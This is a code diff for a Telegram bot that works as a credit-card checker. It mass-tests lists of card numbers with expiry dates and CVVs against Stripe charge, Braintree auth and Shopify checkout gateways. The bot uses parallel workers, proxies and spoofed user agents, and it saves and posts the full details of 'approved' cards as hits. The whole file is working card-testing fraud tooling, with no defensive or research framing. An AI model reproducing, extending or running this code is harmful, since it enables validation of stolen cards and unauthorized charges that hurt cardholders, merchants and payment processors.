+    processing_msg = bot.reply_to(message, "💳 *Checking with Stripe Charge $10 Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
+    
+    bin_info = bin_lookup(cc[:6])
+    category, status_msg, response_msg, price, gateway, elapsed = check_stripe_charge(cc, month, year, cvv)
+    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
+    response = format_sc_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
+    
+    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
+        hit_data = {
+            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+            'category': category, 'status_msg': status_msg,
+            'response_msg': response_msg,
+            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+            'bin_info': bin_info,
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        save_sc_hit(hit_data)
+    
+    try:
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+
+# ============================================
+# BRAINTREE AUTH INDIVIDUAL COMMAND
+# ============================================
+
+@bot.message_handler(commands=['b3'])
+def b3_command(message):
+    global b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data
+    args = message.text.split()
+    if len(args) < 2:
+        bot.reply_to(message, "❌ Format: /b3 cc|mm|yy|cvv")
+        return
+    card_str = args[1]
+    if '|' not in card_str and len(args) >= 5:
+        card_str = f"{args[1]}|{args[2]}|{args[3]}|{args[4]}"
+    parts = card_str.split('|')
+    if len(parts) < 4:
+        bot.reply_to(message, "❌ Invalid format. Use: cc|mm|yy|cvv")
+        return
+    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+    if not cc.isdigit() or len(cc) < 13:
+        bot.reply_to(message, "❌ Invalid card number")
+        return
+    
+    processing_msg = bot.reply_to(message, "💳 *Checking with Braintree Auth $0 Gateway...*\n⏳ Please wait...", parse_mode='Markdown')
+    
+    bin_info = bin_lookup(cc[:6])
+    result = check_braintree_auth(cc, month, year, cvv, session=b3_http_session, auth_fp=b3_auth_fp, apm_nonce=b3_apm_nonce, config_data=b3_config_data)
+    category, status_msg, response_msg, price, gateway, elapsed, b3_http_session, b3_auth_fp, b3_apm_nonce, b3_config_data = result
+    card_data = {'cc': cc, 'month': month, 'year': year, 'cvv': cvv}
+    response = format_b3_response(card_data, category, status_msg, response_msg, price, gateway, elapsed, bin_info)
+    
+    if category in ['LIVE', '3DS', 'CVV']:
+        hit_data = {
+            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+            'category': category, 'status_msg': status_msg,
+            'response_msg': response_msg,
+            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+            'bin_info': bin_info,
+            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        }
+        save_b3_hit(hit_data)
+    
+    try:
+        bot.edit_message_text(response, chat_id=message.chat.id, message_id=processing_msg.message_id, parse_mode='Markdown')
+    except:
+        bot.edit_message_text(response.replace('*', ''), chat_id=message.chat.id, message_id=processing_msg.message_id)
+
+# ============================================
+# STRIPE CHARGE MASS CHECK
+# ============================================
+
+@bot.message_handler(commands=['msc'])
+def sc_mass_command(message):
+    global sc_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
+    
+    if mass_check_running or stripe_mass_running or sc_mass_running:
+        bot.reply_to(message, "⚠️ A mass check is already in progress. Use STOP button or /stop")
+        return
+    
+    cards = get_all_sc_cards()
     if not cards:
-        text = "❌ Primero sube tarjetas con /upload"
-        if is_callback:
-            await update.callback_query.edit_message_text(text)
-        else:
-            await update.message.reply_text(text)
+        bot.reply_to(message, "❌ No Stripe Charge $10 cards saved. Send a .txt file (name with 'charge' or 'sc').")
         return
     
-    amount = 5.00
-    card_index = 0
+    total = len(cards)
     
-    if context.args:
-        try:
-            amount = float(context.args[0].replace('$', ''))
-        except:
-            pass
+    stop_mass_flag = False
+    mass_paused = False
+    sc_mass_running = True
     
-    if len(context.args) > 1:
-        try:
-            card_index = int(context.args[1]) - 1
-        except:
-            pass
-    
-    if card_index < 0 or card_index >= len(cards):
-        text = "❌ Número de tarjeta inválido"
-        if is_callback:
-            await update.callback_query.edit_message_text(text)
-        else:
-            await update.message.reply_text(text)
-        return
-    
-    card_str = cards[card_index]
-    card_data = CardValidator.parse_card(card_str)
-    
-    if not card_data:
-        text = "❌ Tarjeta inválida"
-        if is_callback:
-            await update.callback_query.edit_message_text(text)
-        else:
-            await update.message.reply_text(text)
-        return
-    
-    proxy_count = len(user_data.get("proxies", []))
-    progress_text = (
-        f"🔄 Procesando donación de ${amount:.2f}...\n"
-        f"💳 Tarjeta #{card_index+1}: {card_data['bin']}xxxxxx{card_data['last4']}"
+    control_buttons = InlineKeyboardMarkup(row_width=1)
+    control_buttons.add(
+        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
     )
     
-    if is_callback:
-        await update.callback_query.edit_message_text(progress_text)
-        msg = update.callback_query.message
+    progress_bar = create_progress_bar(0, total)
+    msg_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *STRIPE CHARGE $10 MASS CHECK (1x)*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `WAITING...`
+📝 *Response:* `CONNECTING...`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Charge: *0*  │  ✅ Approved: *0*
+❌ Declined: *0*  │  📊 `[0/{total}]`"""
+    
+    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
+    
+    current_mass_msg = progress_msg
+    current_mass_chat_id = message.chat.id
+    
+    def run_sc_mass(chat_id, msg_id):
+        global sc_mass_running, stop_mass_flag
+        
+        try:
+            _run_sc_mass_inner(chat_id, msg_id)
+        finally:
+            sc_mass_running = False
+            stop_mass_flag = False
+    
+    def _run_sc_mass_inner(chat_id, msg_id):
+        global sc_mass_running, stop_mass_flag
+        
+        # Create session and fetch initial nonce for mass check
+        mass_session = requests.Session()
+        mass_session.headers.update({
+            'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36'
+        })
+        mass_form_hash = sc_fetch_form_nonce(mass_session)
+        
+        stats = {
+            'charge': 0, 'threeds': 0, 'cvv': 0, 'funds': 0,
+            'declined': 0, 'errors': 0, 'total': total
+        }
+        
+        completed = 0
+        last_card = "WAITING..."
+        last_response = "CONNECTING..."
+        last_price = "N/A"
+        cards_since_nonce = [0]  # mutable counter for nonce refresh
+        
+        task_queue = Queue()
+        result_queue = Queue()
+        
+        for card_str in cards:
+            task_queue.put(card_str)
+        
+        for _ in range(SC_PARALLEL_WORKERS):
+            task_queue.put(None)
+        
+        def sc_worker(worker_id):
+            nonlocal mass_form_hash
+            while not stop_mass_flag:
+                if mass_paused:
+                    time.sleep(1)
+                    continue
+                try:
+                    card_str = task_queue.get(timeout=1)
+                    if card_str is None:
+                        break
+                    
+                    # Refresh nonce every 5 cards (like original script)
+                    cards_since_nonce[0] += 1
+                    if cards_since_nonce[0] > 1 and (cards_since_nonce[0] - 1) % 5 == 0:
+                        mass_form_hash = sc_fetch_form_nonce(mass_session)
+                    
+                    parts = card_str.split('|')
+                    if len(parts) < 4:
+                        result_queue.put(('error', card_str, None, worker_id))
+                        continue
+                    
+                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+                    bin_info = bin_lookup(cc[:6])
+                    result = check_stripe_charge(cc, month, year, cvv, session=mass_session, form_hash=mass_form_hash)
+                    result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
+                except:
+                    continue
+        
+        workers = []
+        for i in range(SC_PARALLEL_WORKERS):
+            w = threading.Thread(target=sc_worker, args=(i,))
+            w.daemon = True
+            w.start()
+            workers.append(w)
+        
+        processed_cards = set()
+        update_counter = 0
+        
+        def send_update():
+            nonlocal last_card, last_response, last_price, update_counter
+            
+            total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
+            
+            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
+                progress_bar = create_progress_bar(completed, total)
+                update_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *STRIPE CHARGE $10 MASS CHECK (1x)*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `{last_card}`
+📝 *Response:* `{last_response}`
+💲 *Price:* `{last_price}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Charge: *{stats['charge']}*  │  ✅ Approved: *{total_approved}*
+❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
+                
+                if not stop_mass_flag:
+                    try:
+                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
+                                            parse_mode='Markdown', reply_markup=control_buttons)
+                    except:
+                        pass
+        
+        start_time = time.time()
+        
+        while completed < total and not stop_mass_flag:
+            try:
+                result_data = result_queue.get(timeout=0.5)
+                
+                if result_data[0] == 'error':
+                    card_str = result_data[1]
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    completed += 1
+                    stats['errors'] += 1
+                    delete_sc_card(card_str)
+                    update_counter += 1
+                    send_update()
+                else:
+                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
+                    
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    
+                    category, status_msg, response_msg, price, gateway, elapsed = result
+                    
+                    last_card = f"{cc[:6]}******{cc[-4:]}"
+                    last_response = response_msg if response_msg else status_msg
+                    last_price = price
+                    
+                    if category in ['CHARGE', '3DS', 'CVV', 'FUNDS']:
+                        if category == 'CHARGE':
+                            stats['charge'] += 1
+                        elif category == '3DS':
+                            stats['threeds'] += 1
+                        elif category == 'CVV':
+                            stats['cvv'] += 1
+                        elif category == 'FUNDS':
+                            stats['funds'] += 1
+                        
+                        icon, cat_display, dot = get_status_emoji(category)
+                        hit_msg = f"""{dot} *STRIPE CHARGE $10 ─ APPROVED* {dot}
+{LINE_THIN}
+💳 `{cc}|{month}|{year}|{cvv}`
+🌐 {gateway}
+📝 {response_msg}
+💲 {price}
+{LINE_THIN}"""
+                        
+                        try:
+                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
+                        except:
+                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
+                        
+                        hit_data = {
+                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+                            'category': category, 'status_msg': response_msg,
+                            'response_msg': response_msg,
+                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+                            'bin_info': bin_info,
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        save_sc_hit(hit_data)
+                    elif category == 'DECLINED':
+                        stats['declined'] += 1
+                    else:
+                        stats['errors'] += 1
+                    
+                    completed += 1
+                    delete_sc_card(card_str)
+                    update_counter += 1
+                    send_update()
+                    
+            except:
+                continue
+        
+        for w in workers:
+            try:
+                w.join(timeout=2)
+            except:
+                pass
+        
+        elapsed = time.time() - start_time
+        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
+        total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
+        
+        try:
+            sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
+        except:
+            pass
+        
+        was_stopped = stop_mass_flag
+        status_label = "🛑 *MASS CHECK STOPPED*" if was_stopped else "🏁 *MASS CHECK COMPLETED*"
+        
+        final_bar = create_progress_bar(completed, total)
+        final_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{status_label}
+
+`{final_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 *Charge:* {stats['charge']}
+✅ *Approved:* {total_approved}
+❌ *Declined:* {stats['declined']}
+📊 *Total:* {completed}
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+⏱ *Time:* {minutes}m {seconds}s"""
+        
+        result_keyboard = InlineKeyboardMarkup()
+        result_keyboard.row(
+            InlineKeyboardButton("🏆 Ver Hits", callback_data="sc_hits"),
+            InlineKeyboardButton("📦 Nuevo Mass", callback_data="sc_mass")
+        )
+        
+        try:
+            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
+                                parse_mode='Markdown', reply_markup=result_keyboard)
+        except:
+            pass
+    
+    t = threading.Thread(target=run_sc_mass, args=(message.chat.id, progress_msg.message_id))
+    t.daemon = True
+    t.start()
+
+# ============================================
+# STRIPE CHARGE HITS & CLEAR COMMANDS
+# ============================================
+
+@bot.message_handler(commands=['schits'])
+def sc_hits_command(message):
+    hits = get_sc_hits()
+    if not hits:
+        bot.reply_to(message, "❌ No Stripe Charge $10 hits yet")
+        return
+    response = f"💳 *{BOT_NAME} ─ STRIPE CHARGE $10 HITS ({len(hits)})*\n{LINE_DASH}\n\n"
+    for i, hit in enumerate(hits[-20:], 1):
+        cc = hit.get('cc', '?')
+        month = hit.get('month', '?')
+        year = hit.get('year', '?')
+        cvv = hit.get('cvv', '?')
+        cat = hit.get('category', '?')
+        icon, _, dot = get_status_emoji(cat)
+        response += f"  {dot} `{cc}|{month}|{year}|{cvv}`\n"
+        response += f"     └─ {icon} {cat}\n"
+    response += f"\n{LINE_THIN}\n📊 Total hits: *{len(hits)}*"
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
+
+@bot.message_handler(commands=['clearsc'])
+def clear_sc_command(message):
+    count = len(get_all_sc_cards())
+    clear_sc_cards()
+    response = f"""🗑️ *{BOT_NAME} ─ STRIPE CHARGE CARDS DELETED*
+{LINE_THIN}
+💳 *Cards deleted:* {count}
+📊 *Remaining:* 0
+
+💡 Send a new `.txt` file (name with 'charge' or 'sc') to load more cards"""
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
+
+# ============================================
+# BRAINTREE AUTH MASS CHECK (1x - SEQUENTIAL)
+# ============================================
+
+@bot.message_handler(commands=['mb3'])
+def b3_mass_command(message):
+    global b3_mass_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused, b3_http_session, b3_auth_fp
+    
+    if mass_check_running or stripe_mass_running or sc_mass_running or b3_mass_running:
+        bot.reply_to(message, "⚠️ A mass check is already in progress. Use STOP button or /stop")
+        return
+    
+    cards = get_all_b3_cards()
+    if not cards:
+        bot.reply_to(message, "❌ No Braintree Auth cards saved. Send a .txt file and select Braintree Auth.")
+        return
+    
+    total = len(cards)
+    
+    stop_mass_flag = False
+    mass_paused = False
+    b3_mass_running = True
+    
+    control_buttons = InlineKeyboardMarkup(row_width=1)
+    control_buttons.add(
+        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
+    )
+    
+    progress_bar = create_progress_bar(0, total)
+    msg_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *BRAINTREE AUTH $0 MASS CHECK (1x)*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `WAITING...`
+📝 *Response:* `CONNECTING...`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Live: *0*  │  ✅ Approved: *0*
+❌ Declined: *0*  │  📊 `[0/{total}]`"""
+    
+    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
+    
+    current_mass_msg = progress_msg
+    current_mass_chat_id = message.chat.id
+    
+    def run_b3_mass(chat_id, msg_id):
+        global b3_mass_running, stop_mass_flag
+        
+        try:
+            _run_b3_mass_inner(chat_id, msg_id)
+        finally:
+            b3_mass_running = False
+            stop_mass_flag = False
+    
+    def _run_b3_mass_inner(chat_id, msg_id):
+        global b3_mass_running, stop_mass_flag
+        
+        b3_init_session_pool()
+        
+        stats = {
+            'live': 0, 'threeds': 0, 'cvv': 0,
+            'declined': 0, 'errors': 0, 'total': total
+        }
+        
+        completed = 0
+        last_card = "WAITING..."
+        last_response = "CONNECTING..."
+        last_price = "N/A"
+        
+        task_queue = Queue()
+        result_queue = Queue()
+        
+        for card_str in cards:
+            task_queue.put(card_str)
+        
+        for _ in range(B3_PARALLEL_WORKERS):
+            task_queue.put(None)
+        
+        def b3_worker(worker_id):
+            while not stop_mass_flag:
+                if mass_paused:
+                    time.sleep(1)
+                    continue
+                try:
+                    card_str = task_queue.get(timeout=1)
+                    if card_str is None:
+                        break
+                    
+                    parts = card_str.split('|')
+                    if len(parts) < 4:
+                        result_queue.put(('error', card_str, None, worker_id))
+                        continue
+                    
+                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+                    bin_info = bin_lookup(cc[:6])
+                    result = check_braintree_auth(cc, month, year, cvv, use_pool=True)
+                    category, status_msg, response_msg, price, gateway, elapsed, _, _, _, _ = result
+                    result_queue.put(('success', card_str, (category, status_msg, response_msg, price, gateway, elapsed), worker_id, cc, month, year, cvv, bin_info))
+                except:
+                    continue
+        
+        workers = []
+        for i in range(B3_PARALLEL_WORKERS):
+            w = threading.Thread(target=b3_worker, args=(i,))
+            w.daemon = True
+            w.start()
+            workers.append(w)
+        
+        processed_cards = set()
+        update_counter = 0
+        
+        def send_update():
+            nonlocal last_card, last_response, last_price, update_counter
+            
+            total_approved = stats['live'] + stats['threeds'] + stats['cvv']
+            
+            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
+                progress_bar = create_progress_bar(completed, total)
+                update_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *BRAINTREE AUTH $0 MASS CHECK (1x)*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `{last_card}`
+📝 *Response:* `{last_response}`
+💲 *Price:* `{last_price}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Live: *{stats['live']}*  │  ✅ Approved: *{total_approved}*
+❌ Declined: *{stats['declined']}*  │  📊 `[{completed}/{total}]`"""
+                
+                if not stop_mass_flag:
+                    try:
+                        bot.edit_message_text(update_text, chat_id=chat_id, message_id=msg_id,
+                                            parse_mode='Markdown', reply_markup=control_buttons)
+                    except:
+                        pass
+        
+        start_time = time.time()
+        
+        while completed < total and not stop_mass_flag:
+            try:
+                result_data = result_queue.get(timeout=0.5)
+                
+                if result_data[0] == 'error':
+                    card_str = result_data[1]
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    completed += 1
+                    stats['errors'] += 1
+                    delete_b3_card(card_str)
+                    update_counter += 1
+                    send_update()
+                else:
+                    _, card_str, result, worker_id, cc, month, year, cvv, bin_info = result_data
+                    
+                    if card_str in processed_cards:
+                        continue
+                    processed_cards.add(card_str)
+                    
+                    category, status_msg, response_msg, price, gateway, elapsed = result
+                    
+                    last_card = f"{cc[:6]}******{cc[-4:]}"
+                    last_response = response_msg if response_msg else status_msg
+                    last_price = price
+                    
+                    if category in ['LIVE', '3DS', 'CVV']:
+                        if category == 'LIVE':
+                            stats['live'] += 1
+                        elif category == '3DS':
+                            stats['threeds'] += 1
+                        elif category == 'CVV':
+                            stats['cvv'] += 1
+                        
+                        icon, cat_display, dot = get_status_emoji(category)
+                        hit_msg = f"""{dot} *BRAINTREE AUTH $0 ─ APPROVED* {dot}
+{LINE_THIN}
+💳 `{cc}|{month}|{year}|{cvv}`
+🌐 {gateway}
+📝 {response_msg}
+💲 {price}
+{LINE_THIN}"""
+                        
+                        try:
+                            bot.send_message(chat_id, hit_msg, parse_mode='Markdown')
+                        except:
+                            bot.send_message(chat_id, hit_msg.replace('`', '').replace('*', ''))
+                        
+                        hit_data = {
+                            'cc': cc, 'month': month, 'year': year, 'cvv': cvv,
+                            'category': category, 'status_msg': response_msg,
+                            'response_msg': response_msg,
+                            'gateway': gateway, 'price': price, 'elapsed': elapsed,
+                            'bin_info': bin_info,
+                            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        }
+                        save_b3_hit(hit_data)
+                    elif category == 'DECLINED':
+                        stats['declined'] += 1
+                    else:
+                        stats['errors'] += 1
+                    
+                    completed += 1
+                    delete_b3_card(card_str)
+                    update_counter += 1
+                    send_update()
+                    
+            except:
+                continue
+        
+        for w in workers:
+            try:
+                w.join(timeout=2)
+            except:
+                pass
+        
+        elapsed = time.time() - start_time
+        minutes, seconds = int(elapsed // 60), int(elapsed % 60)
+        total_approved = stats['live'] + stats['threeds'] + stats['cvv']
+        
+        try:
+            sqlite_backup.update_daily_stats(completed, total_approved, stats['declined'], stats['errors'], 0, 0, current_mode)
+        except:
+            pass
+        
+        was_stopped = stop_mass_flag
+        status_label = "🛑 *MASS CHECK STOPPED*" if was_stopped else "🏁 *MASS CHECK COMPLETED*"
+        
+        final_bar = create_progress_bar(completed, total)
+        final_text = f"""💳 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+{status_label}
+
+`{final_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 *Live:* {stats['live']}
+✅ *Approved:* {total_approved}
+❌ *Declined:* {stats['declined']}
+📊 *Total:* {completed}
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+⏱ *Time:* {minutes}m {seconds}s"""
+        
+        result_keyboard = InlineKeyboardMarkup()
+        result_keyboard.row(
+            InlineKeyboardButton("🏆 Ver Hits", callback_data="b3_hits"),
+            InlineKeyboardButton("📦 Nuevo Mass", callback_data="b3_mass")
+        )
+        
+        try:
+            bot.edit_message_text(final_text, chat_id=chat_id, message_id=msg_id,
+                                parse_mode='Markdown', reply_markup=result_keyboard)
+        except:
+            pass
+    
+    t = threading.Thread(target=run_b3_mass, args=(message.chat.id, progress_msg.message_id))
+    t.daemon = True
+    t.start()
+
+# ============================================
+# BRAINTREE AUTH HITS & CLEAR COMMANDS
+# ============================================
+
+@bot.message_handler(commands=['b3hits'])
+def b3_hits_command(message):
+    hits = get_b3_hits()
+    if not hits:
+        bot.reply_to(message, "❌ No Braintree Auth hits yet")
+        return
+    response = f"💳 *{BOT_NAME} ─ BRAINTREE AUTH $0 HITS ({len(hits)})*\n{LINE_DASH}\n\n"
+    for i, hit in enumerate(hits[-20:], 1):
+        cc = hit.get('cc', '?')
+        month = hit.get('month', '?')
+        year = hit.get('year', '?')
+        cvv = hit.get('cvv', '?')
+        cat = hit.get('category', '?')
+        icon, _, dot = get_status_emoji(cat)
+        response += f"  {dot} `{cc}|{month}|{year}|{cvv}`\n"
+        response += f"     └─ {icon} {cat}\n"
+    response += f"\n{LINE_THIN}\n📊 Total hits: *{len(hits)}*"
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
+
+@bot.message_handler(commands=['clearb3'])
+def clear_b3_command(message):
+    count = len(get_all_b3_cards())
+    clear_b3_cards()
+    response = f"""🗑️ *{BOT_NAME} ─ BRAINTREE AUTH CARDS DELETED*
+{LINE_THIN}
+💳 *Cards deleted:* {count}
+📊 *Remaining:* 0
+
+💡 Send a new `.txt` file and select Braintree Auth to load more cards"""
+    safe_send_message(message.chat.id, response, parse_mode='Markdown')
+
+# ============================================
+# PROXY DELETE COMMAND
+# ============================================
+
+@bot.message_handler(commands=['delproxy'])
+def delete_proxy_command(message):
+    """Eliminar un proxy específico por índice o todos"""
+    args = message.text.split()
+    if len(args) < 2:
+        # Mostrar lista de proxies con índices
+        proxies = load_proxies()
+        if not proxies:
+            bot.reply_to(message, "📭 No proxies saved.")
+            return
+        
+        response = f"📡 *{BOT_NAME} ─ PROXIES ({len(proxies)})*\n{LINE_DASH}\n\n"
+        for i, proxy in enumerate(proxies, 1):
+            parts = proxy.split(':')
+            masked = f"{parts[0]}:{parts[1]}"
+            if len(parts) >= 4:
+                masked += ":****:****"
+            response += f"  {i}. `{masked}`\n"
+        
+        response += f"\n{LINE_THIN}\n💡 `/delproxy <number>` to delete │ `/delproxy all` to clear"
+        safe_send_message(message.chat.id, response, parse_mode='Markdown')
+        return
+    
+    if args[1].lower() == 'all':
+        count = len(load_proxies())
+        clear_all_proxies()
+        bot.reply_to(message, f"✅ Deleted {count} proxies")
+        return
+    
+    try:
+        index = int(args[1])
+        removed = delete_proxy_by_index(index)
+        if removed:
+            bot.reply_to(message, f"✅ Deleted proxy: `{removed}`", parse_mode='Markdown')
+        else:
+            bot.reply_to(message, f"❌ Invalid index. Use `/delproxy` to see list")
+    except ValueError:
+        bot.reply_to(message, "❌ Invalid number. Use `/delproxy <number>` or `/delproxy all`")
+
+# ============================================
+# MASS CHECK SHOPIFY (CON BOTONES SOLO STOP Y UPDATE CADA 5 CHK)
+# ============================================
+
+@bot.message_handler(commands=['mass'])
+def mass_check_command(message):
+    global mass_check_running, stop_mass_flag, current_mass_msg, current_mass_chat_id, mass_paused
+    
+    if mass_check_running:
+        bot.reply_to(message, "⚠️ Mass check already in progress. Use STOP button or /stop")
+        return
+    
+    sites = load_sites()
+    if not sites:
+        bot.reply_to(message, "❌ NO SITES AVAILABLE!\n\nPlease add sites first:\n/addsite https://store.myshopify.com")
+        return
+    
+    cards = get_all_cards()
+    if not cards:
+        bot.reply_to(message, "❌ No Shopify cards saved. Send a .txt file.")
+        return
+    
+    total = len(cards)
+    
+    stop_mass_flag = False
+    mass_paused = False
+    mass_check_running = True
+    
+    # Botones estilo foto - SOLO STOP
+    control_buttons = InlineKeyboardMarkup(row_width=1)
+    control_buttons.add(
+        InlineKeyboardButton("🛑 DETENER MASS CHECK", callback_data="stop_mass")
+    )
+    
+    progress_bar = create_progress_bar(0, total)
+    msg_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *SHOPIFY MASS CHECK*
+
+`{progress_bar}`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💳 *Card:* `WAITING...`
+📝 *Response:* `CONNECTING...`
+┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈
+💰 Charge: *0*  │  ✅ Approved: *0*
+❌ Declined: *0*  │  📊 `[0/{total}]`"""
+    
+    progress_msg = safe_send_message(message.chat.id, msg_text, parse_mode='Markdown', reply_markup=control_buttons)
+    
+    current_mass_msg = progress_msg
+    current_mass_chat_id = message.chat.id
+    
+    def run_shopify_mass(chat_id, msg_id):
+        global mass_check_running, stop_mass_flag
+        
+        try:
+            _run_shopify_mass_inner(chat_id, msg_id)
+        finally:
+            mass_check_running = False
+            stop_mass_flag = False
+    
+    def _run_shopify_mass_inner(chat_id, msg_id):
+        global mass_check_running, stop_mass_flag
+        
+        stats = {
+            'charge': 0, 'threeds': 0, 'cvv': 0, 'funds': 0,
+            'declined': 0, 'errors': 0, 'total': total
+        }
+        
+        completed = 0
+        last_card = "WAITING..."
+        last_response = "CONNECTING..."
+        last_price = "$0.00"
+        last_bin_info = None
+        
+        task_queue = Queue()
+        result_queue = Queue()
+        
+        for card_str in cards:
+            task_queue.put(card_str)
+        
+        for _ in range(PARALLEL_WORKERS):
+            task_queue.put(None)
+        
+        def shopify_worker(worker_id):
+            while not stop_mass_flag:
+                if mass_paused:
+                    time.sleep(1)
+                    continue
+                try:
+                    card_str = task_queue.get(timeout=1)
+                    if card_str is None:
+                        break
+                    
+                    parts = card_str.split('|')
+                    if len(parts) < 4:
+                        result_queue.put(('error', card_str, None, worker_id))
+                        continue
+                    
+                    cc, month, year, cvv = parts[0].strip(), parts[1].strip(), parts[2].strip(), parts[3].strip()
+                    bin_info = bin_lookup(cc[:6])
+                    result = check_card_shopify(cc, month, year, cvv)
+                    result_queue.put(('success', card_str, result, worker_id, cc, month, year, cvv, bin_info))
+                except:
+                    continue
+        
+        workers = []
+        for i in range(PARALLEL_WORKERS):
+            w = threading.Thread(target=shopify_worker, args=(i,))
+            w.daemon = True
+            w.start()
+            workers.append(w)
+        
+        processed_cards = set()
+        update_counter = 0
+        
+        def send_update():
+            nonlocal last_card, last_response, last_price, update_counter
+            
+            total_approved = stats['charge'] + stats['threeds'] + stats['cvv'] + stats['funds']
+            
+            if update_counter % 5 == 0 or update_counter == 0 or completed == total:
+                progress_bar = create_progress_bar(completed, total)
+                update_text = f"""🛒 *{BOT_NAME} {BOT_VERSION}*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+⚡ *SHOPIFY MASS CHECK*
+
+`{progress_bar}`
